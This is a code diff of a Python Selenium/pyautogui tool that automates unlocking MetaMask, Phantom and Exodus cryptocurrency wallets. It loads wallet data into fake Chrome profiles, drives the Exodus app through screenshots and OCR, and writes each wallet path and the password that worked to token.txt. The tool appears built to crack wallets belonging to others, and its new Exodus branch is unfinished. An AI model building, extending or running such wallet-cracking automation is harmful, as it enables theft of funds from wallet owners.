@@ -1,5 +1,6 @@
 
 # import undetected_chromedriver as uc
+import subprocess
 import time
 from selenium import webdriver
 import pickle
@@ -7,7 +8,10 @@ from urllib.request import urlopen
 from colored import fg, bg, attr  # pip install colored
 import os, shutil
 from selenium.webdriver.common.keys import Keys
-
+import pyautogui
+import numpy as np
+import cv2
+import pytesseract
 class ScannerWalletSelenium:
     ref = None
     driver = None
@@ -88,7 +92,7 @@ class ScannerWalletSelenium:
             else:
                 shutil.copy2(s, d)
 
-    def initChrome(self):
+    def initChromeMetaMask(self):
         profileIndex = self.threadCount
         print('profileIndex', profileIndex)
         if not os.path.exists(rf"C:\Users\{os.getlogin()}\AppData\Local\Google\Chrome\User Data Fake"):
@@ -107,7 +111,7 @@ class ScannerWalletSelenium:
         options = webdriver.ChromeOptions()
         options.add_argument(rf"--user-data-dir=C:\Users\{os.getlogin()}\AppData\Local\Google\Chrome\User Data Fake") #e.g. C:\Users\You\AppData\Local\Google\Chrome\User Data
         options.add_argument(rf'--profile-directory=Profile {profileIndex}') #e.g. Profile 3
-        options.add_argument("--window-size=800,800")
+        options.add_argument("--window-size=800,900")
         options.add_experimental_option("useAutomationExtension", False)
         options.add_experimental_option("excludeSwitches",["enable logging"])
         options.add_experimental_option("excludeSwitches", ["enable automation"])
@@ -117,16 +121,71 @@ class ScannerWalletSelenium:
         self.driver = webdriver.Chrome(options=options)
         self.driver.delete_all_cookies()
 
-    def run(self):
-        self.initChrome()
-        checkLogin = self.login() 
-        if checkLogin == True:
-            open("token.txt", 'a+').write("%s|%s|%s\n"%(self.wallet["path"], self.wallet["wallet"], self.passwordSuccess))
-            time.sleep(100)
-            self.ref.checksuccess.emit(True, self.index, "Login thành công")
+    def initEdoxus(self):
+        subprocess.call([rf'C:\Users\quy.ngovan\AppData\Local\exodus\Exodus.exe'])
+        time.sleep(8)
+        pyautogui.write('Hello There')
+        time.sleep(0.1)
+        pyautogui.press('enter')
+        # screenshot
+        image = pyautogui.screenshot(region=(30,30, 1920, 980))
+        # convert it to numpy array and BGR 
+        # so we can write it to the disk
+        image = cv2.cvtColor(np.array(image), cv2.COLOR_RGB2BGR)
+        # writing it to the disk using opencv
+        cv2.imwrite("image-temp/master-screen.png", image)
+        time.sleep(1)
+        pytesseract.pytesseract.tesseract_cmd = rf'C:\Program Files\Tesseract-OCR\tesseract.exe'
+        firstStepText = pytesseract.image_to_string("image-temp/master-screen.png")
+        # check is New Update Avaliable !
+        if 'New Update Available!' in firstStepText:
+            print(pyautogui.position())
+            pyautogui.moveTo(1850, 65)
+            pyautogui.click(1850, 65)
 
-        if checkLogin == False:
-            time.sleep(3)
-            self.ref.checksuccess.emit(False, self.index, f"Login thất bại")  
-        self.driver.quit()
-        #protected account
+        # move to input pasword
+        time.sleep(0.5)
+        pyautogui.moveTo(960, 410)
+        pyautogui.click(960, 410)
+
+        # move to next button
+        time.sleep(5)
+        pyautogui.moveTo(960, 500)
+
+    def run(self):
+        if self.wallet["wallet"] == "MetaMask":
+            self.initChromeMetaMask()
+            checkLogin = self.login() 
+            if checkLogin == True:
+                open("token.txt", 'a+').write("%s|%s|%s\n"%(self.wallet["path"], self.wallet["wallet"], self.passwordSuccess))
+                time.sleep(30)
+                self.ref.checksuccess.emit(True, self.index, "Login thành công")
+
+            if checkLogin == False:
+                time.sleep(3)
+                self.ref.checksuccess.emit(False, self.index, f"Login thất bại")  
+            self.driver.quit()
+        if self.wallet["wallet"] == "Exodus":
+            self.initEdoxus()
+            checkLogin = None 
+            if checkLogin == True:
+                open("token.txt", 'a+').write("%s|%s|%s\n"%(self.wallet["path"], self.wallet["wallet"], self.passwordSuccess))
+                time.sleep(30)
+                self.ref.checksuccess.emit(True, self.index, "Login thành công")
+
+            if checkLogin == False:
+                time.sleep(3)
+                self.ref.checksuccess.emit(False, self.index, f"Login thất bại")  
+                
+        if self.wallet["wallet"] == "Phantom":
+            self.initChromeMetaMask()
+            checkLogin = self.login() 
+            if checkLogin == True:
+                open("token.txt", 'a+').write("%s|%s|%s\n"%(self.wallet["path"], self.wallet["wallet"], self.passwordSuccess))
+                time.sleep(30)
+                self.ref.checksuccess.emit(True, self.index, "Login thành công")
+
+            if checkLogin == False:
+                time.sleep(3)
+                self.ref.checksuccess.emit(False, self.index, f"Login thất bại")  
+            self.driver.quit()
